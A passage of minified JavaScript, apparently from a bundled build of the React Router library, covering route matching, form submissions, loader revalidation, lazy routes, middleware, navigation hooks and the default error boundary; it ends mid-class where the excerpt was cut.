function fE(r, e, t, o, i, n) {
    let s, a;
    if (i) {
        s = [];
        for (let f of e)
            if (s.push(f),
            f.route.id === i) {
                a = f;
                break
            }
    } else
        s = e,
        a = e[e.length - 1];
    let l = VA(o || ".", qA(s), Li(r.pathname, t) || r.pathname, n === "path");
    if (o == null && (l.search = r.search,
    l.hash = r.hash),
    (o == null || o === "" || o === ".") && a) {
        let f = GA(l.search);
        if (a.route.index && !f)
            l.search = l.search ? l.search.replace(/^\?/, "?index&") : "?index";
        else if (!a.route.index && f) {
            let h = new URLSearchParams(l.search)
              , p = h.getAll("index");
            h.delete("index"),
            p.filter(v => v).forEach(v => h.append("index", v));
            let b = h.toString();
            l.search = b ? `?${b}` : ""
        }
    }
    return t !== "/" && (l.pathname = l.pathname === "/" ? t : Hs([t, l.pathname])),
    jc(l)
}
function _S(r, e, t) {
    if (!t || !iz(t))
        return {
            path: e
        };
    if (t.formMethod && !bz(t.formMethod))
        return {
            path: e,
            error: Mi(405, {
                method: t.formMethod
            })
        };
    let o = () => ({
        path: e,
        error: Mi(400, {
            type: "invalid-body"
        })
    })
      , n = (t.formMethod || "get").toUpperCase()
      , s = l9(e);
    if (t.body !== void 0) {
        if (t.formEncType === "text/plain") {
            if (!ii(n))
                return o();
            let p = typeof t.body == "string" ? t.body : t.body instanceof FormData || t.body instanceof URLSearchParams ? Array.from(t.body.entries()).reduce( (b, [v,T]) => `${b}${v}=${T}
`, "") : String(t.body);
            return {
                path: e,
                submission: {
                    formMethod: n,
                    formAction: s,
                    formEncType: t.formEncType,
                    formData: void 0,
                    json: void 0,
                    text: p
                }
            }
        } else if (t.formEncType === "application/json") {
            if (!ii(n))
                return o();
            try {
                let p = typeof t.body == "string" ? JSON.parse(t.body) : t.body;
                return {
                    path: e,
                    submission: {
                        formMethod: n,
                        formAction: s,
                        formEncType: t.formEncType,
                        formData: void 0,
                        json: p,
                        text: void 0
                    }
                }
            } catch {
                return o()
            }
        }
    }
    er(typeof FormData == "function", "FormData is not available in this environment");
    let a, l;
    if (t.formData)
        a = pE(t.formData),
        l = t.formData;
    else if (t.body instanceof FormData)
        a = pE(t.body),
        l = t.body;
    else if (t.body instanceof URLSearchParams)
        a = t.body,
        l = DS(a);
    else if (t.body == null)
        a = new URLSearchParams,
        l = new FormData;
    else
        try {
            a = new URLSearchParams(t.body),
            l = DS(a)
        } catch {
            return o()
        }
    let f = {
        formMethod: n,
        formAction: s,
        formEncType: t && t.formEncType || "application/x-www-form-urlencoded",
        formData: l,
        json: void 0,
        text: void 0
    };
    if (ii(f.formMethod))
        return {
            path: e,
            submission: f
        };
    let h = Yc(e);
    return r && h.search && GA(h.search) && a.append("index", ""),
    h.search = `?${a}`,
    {
        path: jc(h),
        submission: f
    }
}
function IS(r, e, t, o, i, n, s, a, l, f, h, p, b, v, T, x, E, B, P) {
    var X;
    let O = P ? oi(P[1]) ? P[1].error : P[1].data : void 0, F = i.createURL(n.location), D = i.createURL(l), I;
    if (h && n.errors) {
        let Y = Object.keys(n.errors)[0];
        I = s.findIndex(V => V.route.id === Y)
    } else if (P && oi(P[1])) {
        let Y = P[0];
        I = s.findIndex(V => V.route.id === Y) - 1
    }
    let M = P ? P[1].statusCode : void 0
      , C = M && M >= 400
      , W = {
        currentUrl: F,
        currentParams: ((X = n.matches[0]) == null ? void 0 : X.params) || {},
        nextUrl: D,
        nextParams: s[0].params,
        ...a,
        actionResult: O,
        actionStatus: M
    }
      , k = s.map( (Y, V) => {
        let {route: R} = Y
          , _ = null;
        if (I != null && V > I ? _ = !1 : R.lazy ? _ = !0 : R.loader == null ? _ = !1 : h ? _ = dE(R, n.loaderData, n.errors) : sz(n.loaderData, n.matches[V], Y) && (_ = !0),
        _ !== null)
            return hE(t, o, r, Y, f, e, _);
        let $ = C ? !1 : p || F.pathname + F.search === D.pathname + D.search || F.search !== D.search || az(n.matches[V], Y)
          , z = {
            ...W,
            defaultShouldRevalidate: $
        }
          , K = Vm(Y, z);
        return hE(t, o, r, Y, f, e, K, z)
    }
    )
      , H = [];
    return T.forEach( (Y, V) => {
        if (h || !s.some(ee => ee.route.id === Y.routeId) || v.has(V))
            return;
        let R = Mc(E, Y.path, B);
        if (!R) {
            H.push({
                key: V,
                routeId: Y.routeId,
                path: Y.path,
                matches: null,
                match: null,
                request: null,
                controller: null
            });
            return
        }
        if (x.has(V))
            return;
        let _ = n.fetchers.get(V)
          , $ = Cp(R, Y.path)
          , z = new AbortController
          , K = kf(i, Y.path, z.signal)
          , j = null;
        if (b.has(V))
            b.delete(V),
            j = Zf(t, o, K, R, $, f, e);
        else if (_ && _.state !== "idle" && _.data === void 0)
            p && (j = Zf(t, o, K, R, $, f, e));
        else {
            let ee = {
                ...W,
                defaultShouldRevalidate: C ? !1 : p
            };
            Vm($, ee) && (j = Zf(t, o, K, R, $, f, e, ee))
        }
        j && H.push({
            key: V,
            routeId: Y.routeId,
            path: Y.path,
            matches: j,
            match: $,
            request: K,
            controller: z
        })
    }
    ),
    {
        dsMatches: k,
        revalidatingFetchers: H
    }
}
function dE(r, e, t) {
    if (r.lazy)
        return !0;
    if (!r.loader)
        return !1;
    let o = e != null && r.id in e
      , i = t != null && t[r.id] !== void 0;
    return !o && i ? !1 : typeof r.loader == "function" && r.loader.hydrate === !0 ? !0 : !o && !i
}
function sz(r, e, t) {
    let o = !e || t.route.id !== e.route.id
      , i = !r.hasOwnProperty(t.route.id);
    return o || i
}
function az(r, e) {
    let t = r.route.path;
    return r.pathname !== e.pathname || t != null && t.endsWith("*") && r.params["*"] !== e.params["*"]
}
function Vm(r, e) {
    if (r.route.shouldRevalidate) {
        let t = r.route.shouldRevalidate(e);
        if (typeof t == "boolean")
            return t
    }
    return e.defaultShouldRevalidate
}
function OS(r, e, t, o, i) {
    let n;
    if (r) {
        let l = o[r];
        er(l, `No route found to patch children into: routeId = ${r}`),
        l.children || (l.children = []),
        n = l.children
    } else
        n = t;
    let s = e.filter(l => !n.some(f => o9(l, f)))
      , a = zm(s, i, [r || "_", "patch", String((n == null ? void 0 : n.length) || "0")], o);
    n.push(...a)
}
function o9(r, e) {
    return "id"in r && "id"in e && r.id === e.id ? !0 : r.index === e.index && r.path === e.path && r.caseSensitive === e.caseSensitive ? (!r.children || r.children.length === 0) && (!e.children || e.children.length === 0) ? !0 : r.children.every( (t, o) => {
        var i;
        return (i = e.children) == null ? void 0 : i.some(n => o9(t, n))
    }
    ) : !1
}
var RS = new WeakMap
  , i9 = ({key: r, route: e, manifest: t, mapRouteProperties: o}) => {
    let i = t[e.id];
    if (er(i, "No route found in manifest"),
    !i.lazy || typeof i.lazy != "object")
        return;
    let n = i.lazy[r];
    if (!n)
        return;
    let s = RS.get(i);
    s || (s = {},
    RS.set(i, s));
    let a = s[r];
    if (a)
        return a;
    let l = (async () => {
        let f = _$(r)
          , p = i[r] !== void 0 && r !== "hasErrorBoundary";
        if (f)
            fn(!f, "Route property " + r + " is not a supported lazy route property. This property will be ignored."),
            s[r] = Promise.resolve();
        else if (p)
            fn(!1, `Route "${i.id}" has a static property "${r}" defined. The lazy property will be ignored.`);
        else {
            let b = await n();
            b != null && (Object.assign(i, {
                [r]: b
            }),
            Object.assign(i, o(i)))
        }
        typeof i.lazy == "object" && (i.lazy[r] = void 0,
        Object.values(i.lazy).every(b => b === void 0) && (i.lazy = void 0))
    }
    )();
    return s[r] = l,
    l
}
  , WS = new WeakMap;
function cz(r, e, t, o, i) {
    let n = t[r.id];
    if (er(n, "No route found in manifest"),
    !r.lazy)
        return {
            lazyRoutePromise: void 0,
            lazyHandlerPromise: void 0
        };
    if (typeof r.lazy == "function") {
        let h = WS.get(n);
        if (h)
            return {
                lazyRoutePromise: h,
                lazyHandlerPromise: h
            };
        let p = (async () => {
            er(typeof r.lazy == "function", "No lazy route function found");
            let b = await r.lazy()
              , v = {};
            for (let T in b) {
                let x = b[T];
                if (x === void 0)
                    continue;
                let E = O$(T)
                  , P = n[T] !== void 0 && T !== "hasErrorBoundary";
                E ? fn(!E, "Route property " + T + " is not a supported property to be returned from a lazy route function. This property will be ignored.") : P ? fn(!P, `Route "${n.id}" has a static property "${T}" defined but its lazy function is also returning a value for this property. The lazy route property "${T}" will be ignored.`) : v[T] = x
            }
            Object.assign(n, v),
            Object.assign(n, {
                ...o(n),
                lazy: void 0
            })
        }
        )();
        return WS.set(n, p),
        p.catch( () => {}
        ),
        {
            lazyRoutePromise: p,
            lazyHandlerPromise: p
        }
    }
    let s = Object.keys(r.lazy), a = [], l;
    for (let h of s) {
        if (i && i.includes(h))
            continue;
        let p = i9({
            key: h,
            route: r,
            manifest: t,
            mapRouteProperties: o
        });
        p && (a.push(p),
        h === e && (l = p))
    }
    let f = a.length > 0 ? Promise.all(a).then( () => {}
    ) : void 0;
    return f == null || f.catch( () => {}
    ),
    l == null || l.catch( () => {}
    ),
    {
        lazyRoutePromise: f,
        lazyHandlerPromise: l
    }
}
async function MS(r) {
    let e = r.matches.filter(i => i.shouldLoad)
      , t = {};
    return (await Promise.all(e.map(i => i.resolve()))).forEach( (i, n) => {
        t[e[n].route.id] = i
    }
    ),
    t
}
async function lz(r) {
    return r.matches.some(e => e.route.unstable_middleware) ? s9(r, !1, () => MS(r), (e, t) => ({
        [t]: {
            type: "error",
            result: e
        }
    })) : MS(r)
}
async function s9(r, e, t, o) {
    let {matches: i, request: n, params: s, context: a} = r
      , l = {
        handlerResult: void 0
    };
    try {
        let f = i.flatMap(p => p.route.unstable_middleware ? p.route.unstable_middleware.map(b => [p.route.id, b]) : [])
          , h = await a9({
            request: n,
            params: s,
            context: a
        }, f, e, l, t);
        return e ? h : l.handlerResult
    } catch (f) {
        if (!l.middlewareError)
            throw f;
        let h = await o(l.middlewareError.error, l.middlewareError.routeId);
        return l.handlerResult ? Object.assign(l.handlerResult, h) : h
    }
}
async function a9(r, e, t, o, i, n=0) {
    let {request: s} = r;
    if (s.signal.aborted)
        throw s.signal.reason ? s.signal.reason : new Error(`Request aborted without an \`AbortSignal.reason\`: ${s.method} ${s.url}`);
    let a = e[n];
    if (!a)
        return o.handlerResult = await i(),
        o.handlerResult;
    let[l,f] = a, h = !1, p, b = async () => {
        if (h)
            throw new Error("You may only call `next()` once per middleware");
        h = !0,
        await a9(r, e, t, o, i, n + 1)
    }
    ;
    try {
        let v = await f({
            request: r.request,
            params: r.params,
            context: r.context
        }, b);
        return h ? v === void 0 ? p : v : b()
    } catch (v) {
        throw o.middlewareError ? o.middlewareError.error !== v && (o.middlewareError = {
            routeId: l,
            error: v
        }) : o.middlewareError = {
            routeId: l,
            error: v
        },
        v
    }
}
function c9(r, e, t, o, i) {
    let n = i9({
        key: "unstable_middleware",
        route: o.route,
        manifest: e,
        mapRouteProperties: r
    })
      , s = cz(o.route, ii(t.method) ? "action" : "loader", e, r, i);
    return {
        middleware: n,
        route: s.lazyRoutePromise,
        handler: s.lazyHandlerPromise
    }
}
function hE(r, e, t, o, i, n, s, a=null) {
    let l = !1
      , f = c9(r, e, t, o, i);
    return {
        ...o,
        _lazyPromises: f,
        shouldLoad: s,
        unstable_shouldRevalidateArgs: a,
        unstable_shouldCallHandler(h) {
            return l = !0,
            a ? typeof h == "boolean" ? Vm(o, {
                ...a,
                defaultShouldRevalidate: h
            }) : Vm(o, a) : s
        },
        resolve(h) {
            return l || s || h && t.method === "GET" && (o.route.lazy || o.route.loader) ? fz({
                request: t,
                match: o,
                lazyHandlerPromise: f == null ? void 0 : f.handler,
                lazyRoutePromise: f == null ? void 0 : f.route,
                handlerOverride: h,
                scopedContext: n
            }) : Promise.resolve({
                type: "data",
                result: void 0
            })
        }
    }
}
function Zf(r, e, t, o, i, n, s, a=null) {
    return o.map(l => l.route.id !== i.route.id ? {
        ...l,
        shouldLoad: !1,
        unstable_shouldRevalidateArgs: a,
        unstable_shouldCallHandler: () => !1,
        _lazyPromises: c9(r, e, t, l, n),
        resolve: () => Promise.resolve({
            type: "data",
            result: void 0
        })
    } : hE(r, e, t, l, n, s, !0, a))
}
async function uz(r, e, t, o, i, n) {
    t.some(f => {
        var h;
        return (h = f._lazyPromises) == null ? void 0 : h.middleware
    }
    ) && await Promise.all(t.map(f => {
        var h;
        return (h = f._lazyPromises) == null ? void 0 : h.middleware
    }
    ));
    let s = {
        request: e,
        params: t[0].params,
        context: i,
        matches: t
    }
      , l = await r({
        ...s,
        fetcherKey: o,
        unstable_runClientMiddleware: f => {
            let h = s;
            return s9(h, !1, () => f({
                ...h,
                fetcherKey: o,
                unstable_runClientMiddleware: () => {
                    throw new Error("Cannot call `unstable_runClientMiddleware()` from within an `unstable_runClientMiddleware` handler")
                }
            }), (p, b) => ({
                [b]: {
                    type: "error",
                    result: p
                }
            }))
        }
    });
    try {
        await Promise.all(t.flatMap(f => {
            var h, p;
            return [(h = f._lazyPromises) == null ? void 0 : h.handler, (p = f._lazyPromises) == null ? void 0 : p.route]
        }
        ))
    } catch {}
    return l
}
async function fz({request: r, match: e, lazyHandlerPromise: t, lazyRoutePromise: o, handlerOverride: i, scopedContext: n}) {
    let s, a, l = ii(r.method), f = l ? "action" : "loader", h = p => {
        let b, v = new Promise( (E, B) => b = B);
        a = () => b(),
        r.signal.addEventListener("abort", a);
        let T = E => typeof p != "function" ? Promise.reject(new Error(`You cannot call the handler for a route which defines a boolean "${f}" [routeId: ${e.route.id}]`)) : p({
            request: r,
            params: e.params,
            context: n
        }, ...E !== void 0 ? [E] : [])
          , x = (async () => {
            try {
                return {
                    type: "data",
                    result: await (i ? i(B => T(B)) : T())
                }
            } catch (E) {
                return {
                    type: "error",
                    result: E
                }
            }
        }
        )();
        return Promise.race([x, v])
    }
    ;
    try {
        let p = l ? e.route.action : e.route.loader;
        if (t || o)
            if (p) {
                let b, [v] = await Promise.all([h(p).catch(T => {
                    b = T
                }
                ), t, o]);
                if (b !== void 0)
                    throw b;
                s = v
            } else {
                await t;
                let b = l ? e.route.action : e.route.loader;
                if (b)
                    [s] = await Promise.all([h(b), o]);
                else if (f === "action") {
                    let v = new URL(r.url)
                      , T = v.pathname + v.search;
                    throw Mi(405, {
                        method: r.method,
                        pathname: T,
                        routeId: e.route.id
                    })
                } else
                    return {
                        type: "data",
                        result: void 0
                    }
            }
        else if (p)
            s = await h(p);
        else {
            let b = new URL(r.url)
              , v = b.pathname + b.search;
            throw Mi(404, {
                pathname: v
            })
        }
    } catch (p) {
        return {
            type: "error",
            result: p
        }
    } finally {
        a && r.signal.removeEventListener("abort", a)
    }
    return s
}
async function dz(r) {
    var o, i, n, s, a, l;
    let {result: e, type: t} = r;
    if (u9(e)) {
        let f;
        try {
            let h = e.headers.get("Content-Type");
            h && /\bapplication\/json\b/.test(h) ? e.body == null ? f = null : f = await e.json() : f = await e.text()
        } catch (h) {
            return {
                type: "error",
                error: h
            }
        }
        return t === "error" ? {
            type: "error",
            error: new qm(e.status,e.statusText,f),
            statusCode: e.status,
            headers: e.headers
        } : {
            type: "data",
            data: f,
            statusCode: e.status,
            headers: e.headers
        }
    }
    return t === "error" ? $S(e) ? e.data instanceof Error ? {
        type: "error",
        error: e.data,
        statusCode: (o = e.init) == null ? void 0 : o.status,
        headers: (i = e.init) != null && i.headers ? new Headers(e.init.headers) : void 0
    } : {
        type: "error",
        error: new qm(((n = e.init) == null ? void 0 : n.status) || 500,void 0,e.data),
        statusCode: kp(e) ? e.status : void 0,
        headers: (s = e.init) != null && s.headers ? new Headers(e.init.headers) : void 0
    } : {
        type: "error",
        error: e,
        statusCode: kp(e) ? e.status : void 0
    } : $S(e) ? {
        type: "data",
        data: e.data,
        statusCode: (a = e.init) == null ? void 0 : a.status,
        headers: (l = e.init) != null && l.headers ? new Headers(e.init.headers) : void 0
    } : {
        type: "data",
        data: e
    }
}
function hz(r, e, t, o, i) {
    let n = r.headers.get("Location");
    if (er(n, "Redirects returned/thrown from loaders/actions must have a Location header"),
    !HA.test(n)) {
        let s = o.slice(0, o.findIndex(a => a.route.id === t) + 1);
        n = fE(new URL(e.url), s, i, n),
        r.headers.set("Location", n)
    }
    return r
}
function NS(r, e, t) {
    if (HA.test(r)) {
        let o = r
          , i = o.startsWith("//") ? new URL(e.protocol + o) : new URL(o)
          , n = Li(i.pathname, t) != null;
        if (i.origin === e.origin && n)
            return i.pathname + i.search + i.hash
    }
    return r
}
function kf(r, e, t, o) {
    let i = r.createURL(l9(e)).toString()
      , n = {
        signal: t
    };
    if (o && ii(o.formMethod)) {
        let {formMethod: s, formEncType: a} = o;
        n.method = s.toUpperCase(),
        a === "application/json" ? (n.headers = new Headers({
            "Content-Type": a
        }),
        n.body = JSON.stringify(o.json)) : a === "text/plain" ? n.body = o.text : a === "application/x-www-form-urlencoded" && o.formData ? n.body = pE(o.formData) : n.body = o.formData
    }
    return new Request(i,n)
}
function pE(r) {
    let e = new URLSearchParams;
    for (let[t,o] of r.entries())
        e.append(t, typeof o == "string" ? o : o.name);
    return e
}
function DS(r) {
    let e = new FormData;
    for (let[t,o] of r.entries())
        e.append(t, o);
    return e
}
function pz(r, e, t, o=!1, i=!1) {
    let n = {}, s = null, a, l = !1, f = {}, h = t && oi(t[1]) ? t[1].error : void 0;
    return r.forEach(p => {
        if (!(p.route.id in e))
            return;
        let b = p.route.id
          , v = e[b];
        if (er(!Ll(v), "Cannot handle redirect results in processLoaderData"),
        oi(v)) {
            let T = v.error;
            if (h !== void 0 && (T = h,
            h = void 0),
            s = s || {},
            i)
                s[b] = T;
            else {
                let x = Rl(r, b);
                s[x.route.id] == null && (s[x.route.id] = T)
            }
            o || (n[b] = n9),
            l || (l = !0,
            a = kp(v.error) ? v.error.status : 500),
            v.headers && (f[b] = v.headers)
        } else
            n[b] = v.data,
            v.statusCode && v.statusCode !== 200 && !l && (a = v.statusCode),
            v.headers && (f[b] = v.headers)
    }
    ),
    h !== void 0 && t && (s = {
        [t[0]]: h
    },
    t[2] && (n[t[2]] = void 0)),
    {
        loaderData: n,
        errors: s,
        statusCode: a || 200,
        loaderHeaders: f
    }
}
function FS(r, e, t, o, i, n) {
    let {loaderData: s, errors: a} = pz(e, t, o);
    return i.filter(l => !l.matches || l.matches.some(f => f.shouldLoad)).forEach(l => {
        let {key: f, match: h, controller: p} = l
          , b = n[f];
        if (er(b, "Did not find corresponding fetcher result"),
        !(p && p.signal.aborted))
            if (oi(b)) {
                let v = Rl(r.matches, h == null ? void 0 : h.route.id);
                a && a[v.route.id] || (a = {
                    ...a,
                    [v.route.id]: b.error
                }),
                r.fetchers.delete(f)
            } else if (Ll(b))
                er(!1, "Unhandled fetcher revalidation redirect");
            else {
                let v = Ic(b.data);
                r.fetchers.set(f, v)
            }
    }
    ),
    {
        loaderData: s,
        errors: a
    }
}
function US(r, e, t, o) {
    let i = Object.entries(e).filter( ([,n]) => n !== n9).reduce( (n, [s,a]) => (n[s] = a,
    n), {});
    for (let n of t) {
        let s = n.route.id;
        if (!e.hasOwnProperty(s) && r.hasOwnProperty(s) && n.route.loader && (i[s] = r[s]),
        o && o.hasOwnProperty(s))
            break
    }
    return i
}
function kS(r) {
    return r ? oi(r[1]) ? {
        actionData: {}
    } : {
        actionData: {
            [r[0]]: r[1].data
        }
    } : {}
}
function Rl(r, e) {
    return (e ? r.slice(0, r.findIndex(o => o.route.id === e) + 1) : [...r]).reverse().find(o => o.route.hasErrorBoundary === !0) || r[0]
}
function LS(r) {
    let e = r.length === 1 ? r[0] : r.find(t => t.index || !t.path || t.path === "/") || {
        id: "__shim-error-route__"
    };
    return {
        matches: [{
            params: {},
            pathname: "",
            pathnameBase: "",
            route: e
        }],
        route: e
    }
}
function Mi(r, {pathname: e, routeId: t, method: o, type: i, message: n}={}) {
    let s = "Unknown Server Error"
      , a = "Unknown @remix-run/router error";
    return r === 400 ? (s = "Bad Request",
    o && e && t ? a = `You made a ${o} request to "${e}" but did not provide a \`loader\` for route "${t}", so there is no way to handle the request.` : i === "invalid-body" && (a = "Unable to encode submission body")) : r === 403 ? (s = "Forbidden",
    a = `Route "${t}" does not match URL "${e}"`) : r === 404 ? (s = "Not Found",
    a = `No route matches URL "${e}"`) : r === 405 && (s = "Method Not Allowed",
    o && e && t ? a = `You made a ${o.toUpperCase()} request to "${e}" but did not provide an \`action\` for route "${t}", so there is no way to handle the request.` : o && (a = `Invalid request method "${o.toUpperCase()}"`)),
    new qm(r || 500,s,new Error(a),!0)
}
function Kg(r) {
    let e = Object.entries(r);
    for (let t = e.length - 1; t >= 0; t--) {
        let[o,i] = e[t];
        if (Ll(i))
            return {
                key: o,
                result: i
            }
    }
}
function l9(r) {
    let e = typeof r == "string" ? Yc(r) : r;
    return jc({
        ...e,
        hash: ""
    })
}
function gz(r, e) {
    return r.pathname !== e.pathname || r.search !== e.search ? !1 : r.hash === "" ? e.hash !== "" : r.hash === e.hash ? !0 : e.hash !== ""
}
function yz(r) {
    return u9(r.result) && ez.has(r.result.status)
}
function oi(r) {
    return r.type === "error"
}
function Ll(r) {
    return (r && r.type) === "redirect"
}
function $S(r) {
    return typeof r == "object" && r != null && "type"in r && "data"in r && "init"in r && r.type === "DataWithResponseInit"
}
function u9(r) {
    return r != null && typeof r.status == "number" && typeof r.statusText == "string" && typeof r.headers == "object" && typeof r.body < "u"
}
function bz(r) {
    return Q$.has(r.toUpperCase())
}
function ii(r) {
    return X$.has(r.toUpperCase())
}
function GA(r) {
    return new URLSearchParams(r).getAll("index").some(e => e === "")
}
function Cp(r, e) {
    let t = typeof e == "string" ? Yc(e).search : e.search;
    if (r[r.length - 1].route.index && GA(t || ""))
        return r[r.length - 1];
    let o = e9(r);
    return o[o.length - 1]
}
function zS(r) {
    let {formMethod: e, formAction: t, formEncType: o, text: i, formData: n, json: s} = r;
    if (!(!e || !t || !o)) {
        if (i != null)
            return {
                formMethod: e,
                formAction: t,
                formEncType: o,
                formData: void 0,
                json: void 0,
                text: i
            };
        if (n != null)
            return {
                formMethod: e,
                formAction: t,
                formEncType: o,
                formData: n,
                json: void 0,
                text: void 0
            };
        if (s !== void 0)
            return {
                formMethod: e,
                formAction: t,
                formEncType: o,
                formData: void 0,
                json: s,
                text: void 0
            }
    }
}
function Dv(r, e) {
    return e ? {
        state: "loading",
        location: r,
        formMethod: e.formMethod,
        formAction: e.formAction,
        formEncType: e.formEncType,
        formData: e.formData,
        json: e.json,
        text: e.text
    } : {
        state: "loading",
        location: r,
        formMethod: void 0,
        formAction: void 0,
        formEncType: void 0,
        formData: void 0,
        json: void 0,
        text: void 0
    }
}
function mz(r, e) {
    return {
        state: "submitting",
        location: r,
        formMethod: e.formMethod,
        formAction: e.formAction,
        formEncType: e.formEncType,
        formData: e.formData,
        json: e.json,
        text: e.text
    }
}
function op(r, e) {
    return r ? {
        state: "loading",
        formMethod: r.formMethod,
        formAction: r.formAction,
        formEncType: r.formEncType,
        formData: r.formData,
        json: r.json,
        text: r.text,
        data: e
    } : {
        state: "loading",
        formMethod: void 0,
        formAction: void 0,
        formEncType: void 0,
        formData: void 0,
        json: void 0,
        text: void 0,
        data: e
    }
}
function xz(r, e) {
    return {
        state: "submitting",
        formMethod: r.formMethod,
        formAction: r.formAction,
        formEncType: r.formEncType,
        formData: r.formData,
        json: r.json,
        text: r.text,
        data: e ? e.data : void 0
    }
}
function Ic(r) {
    return {
        state: "idle",
        formMethod: void 0,
        formAction: void 0,
        formEncType: void 0,
        formData: void 0,
        json: void 0,
        text: void 0,
        data: r
    }
}
function wz(r, e) {
    try {
        let t = r.sessionStorage.getItem(r9);
        if (t) {
            let o = JSON.parse(t);
            for (let[i,n] of Object.entries(o || {}))
                n && Array.isArray(n) && e.set(i, new Set(n || []))
        }
    } catch {}
}
function vz(r, e) {
    if (e.size > 0) {
        let t = {};
        for (let[o,i] of e)
            t[o] = [...i];
        try {
            r.sessionStorage.setItem(r9, JSON.stringify(t))
        } catch (o) {
            fn(!1, `Failed to save applied view transitions in sessionStorage (${o}).`)
        }
    }
}
function Tz() {
    let r, e, t = new Promise( (o, i) => {
        r = async n => {
            o(n);
            try {
                await t
            } catch {}
        }
        ,
        e = async n => {
            i(n);
            try {
                await t
            } catch {}
        }
    }
    );
    return {
        promise: t,
        resolve: r,
        reject: e
    }
}
var vu = ue.createContext(null);
vu.displayName = "DataRouter";
var u0 = ue.createContext(null);
u0.displayName = "DataRouterState";
var KA = ue.createContext({
    isTransitioning: !1
});
KA.displayName = "ViewTransition";
var f9 = ue.createContext(new Map);
f9.displayName = "Fetchers";
var Ez = ue.createContext(null);
Ez.displayName = "Await";
var Xs = ue.createContext(null);
Xs.displayName = "Navigation";
var v1 = ue.createContext(null);
v1.displayName = "Location";
var Js = ue.createContext({
    outlet: null,
    matches: [],
    isDataRoute: !1
});
Js.displayName = "Route";
var ZA = ue.createContext(null);
ZA.displayName = "RouteError";
function Az(r, {relative: e}={}) {
    er(f0(), "useHref() may be used only in the context of a <Router> component.");
    let {basename: t, navigator: o} = ue.useContext(Xs)
      , {hash: i, pathname: n, search: s} = d0(r, {
        relative: e
    })
      , a = n;
    return t !== "/" && (a = n === "/" ? t : Hs([t, n])),
    o.createHref({
        pathname: a,
        search: s,
        hash: i
    })
}
function f0() {
    return ue.useContext(v1) != null
}
function Tu() {
    return er(f0(), "useLocation() may be used only in the context of a <Router> component."),
    ue.useContext(v1).location
}
var d9 = "You should call navigate() in a React.useEffect(), not when your component is first rendered.";
function h9(r) {
    ue.useContext(Xs).static || ue.useLayoutEffect(r)
}
function Pz() {
    let {isDataRoute: r} = ue.useContext(Js);
    return r ? Lz() : Cz()
}
function Cz() {
    er(f0(), "useNavigate() may be used only in the context of a <Router> component.");
    let r = ue.useContext(vu)
      , {basename: e, navigator: t} = ue.useContext(Xs)
      , {matches: o} = ue.useContext(Js)
      , {pathname: i} = Tu()
      , n = JSON.stringify(qA(o))
      , s = ue.useRef(!1);
    return h9( () => {
        s.current = !0
    }
    ),
    ue.useCallback( (l, f={}) => {
        if (fn(s.current, d9),
        !s.current)
            return;
        if (typeof l == "number") {
            t.go(l);
            return
        }
        let h = VA(l, JSON.parse(n), i, f.relative === "path");
        r == null && e !== "/" && (h.pathname = h.pathname === "/" ? e : Hs([e, h.pathname])),
        (f.replace ? t.replace : t.push)(h, f.state, f)
    }
    , [e, t, n, i, r])
}
var Sz = ue.createContext(null);
function Bz(r) {
    let e = ue.useContext(Js).outlet;
    return e && ue.createElement(Sz.Provider, {
        value: r
    }, e)
}
function d0(r, {relative: e}={}) {
    let {matches: t} = ue.useContext(Js)
      , {pathname: o} = Tu()
      , i = JSON.stringify(qA(t));
    return ue.useMemo( () => VA(r, JSON.parse(i), o, e === "path"), [r, i, o, e])
}
function _z(r, e, t, o) {
    er(f0(), "useRoutes() may be used only in the context of a <Router> component.");
    let {navigator: i, static: n} = ue.useContext(Xs)
      , {matches: s} = ue.useContext(Js)
      , a = s[s.length - 1]
      , l = a ? a.params : {}
      , f = a ? a.pathname : "/"
      , h = a ? a.pathnameBase : "/"
      , p = a && a.route;
    {
        let P = p && p.path || "";
        p9(f, !p || P.endsWith("*") || P.endsWith("*?"), `You rendered descendant <Routes> (or called \`useRoutes()\`) at "${f}" (under <Route path="${P}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${P}"> to <Route path="${P === "/" ? "*" : `${P}/*`}">.`)
    }
    let b = Tu(), v;
    v = b;
    let T = v.pathname || "/"
      , x = T;
    if (h !== "/") {
        let P = h.replace(/^\//, "").split("/");
        x = "/" + T.replace(/^\//, "").split("/").slice(P.length).join("/")
    }
    let E = !n && t && t.matches && t.matches.length > 0 ? t.matches : Mc(r, {
        pathname: x
    });
    return fn(p || E != null, `No routes matched location "${v.pathname}${v.search}${v.hash}" `),
    fn(E == null || E[E.length - 1].route.element !== void 0 || E[E.length - 1].route.Component !== void 0 || E[E.length - 1].route.lazy !== void 0, `Matched leaf route at location "${v.pathname}${v.search}${v.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`),
    Mz(E && E.map(P => Object.assign({}, P, {
        params: Object.assign({}, l, P.params),
        pathname: Hs([h, i.encodeLocation ? i.encodeLocation(P.pathname).pathname : P.pathname]),
        pathnameBase: P.pathnameBase === "/" ? h : Hs([h, i.encodeLocation ? i.encodeLocation(P.pathnameBase).pathname : P.pathnameBase])
    })), s, t, o)
}
function Iz() {
    let r = kz()
      , e = kp(r) ? `${r.status} ${r.statusText}` : r instanceof Error ? r.message : JSON.stringify(r)
      , t = r instanceof Error ? r.stack : null
      , o = "rgba(200,200,200, 0.5)"
      , i = {
        padding: "0.5rem",
        backgroundColor: o
    }
      , n = {
        padding: "2px 4px",
        backgroundColor: o
    }
      , s = null;
    return console.error("Error handled by React Router default ErrorBoundary:", r),
    s = ue.createElement(ue.Fragment, null, ue.createElement("p", null, " Hey developer "), ue.createElement("p", null, "You can provide a way better UX than this when your app throws errors by providing your own ", ue.createElement("code", {
        style: n
    }, "ErrorBoundary"), " or", " ", ue.createElement("code", {
        style: n
    }, "errorElement"), " prop on your route.")),
    ue.createElement(ue.Fragment, null, ue.createElement("h2", null, "Unexpected Application Error!"), ue.createElement("h3", {
        style: {
            fontStyle: "italic"
        }
    }, e), t ? ue.createElement("pre", {
        style: i
    }, t) : null, s)
}
var Oz = ue.createElement(Iz, null)
  , Rz = class extends ue.Component {
    constructor(r) {
        super(r),
        this.state = {
            location: r.location,
            revalidation: r.revalidation,
            error: r.error
        }
    }
    static getDerivedStateFromError(r) {
        return {
            error: r
        }
    }
    static getDerivedStateFromProps(r, e) {
        return e.location !== r.location || e.revalidation !== "idle" && r.revalidation === "idle" ? {
            error: r.error,
            location: r.location,
            revalidation: r.revalidation
        } : {
            error: r.error !== void 0 ? r.error : e.error,
            location: e.location,
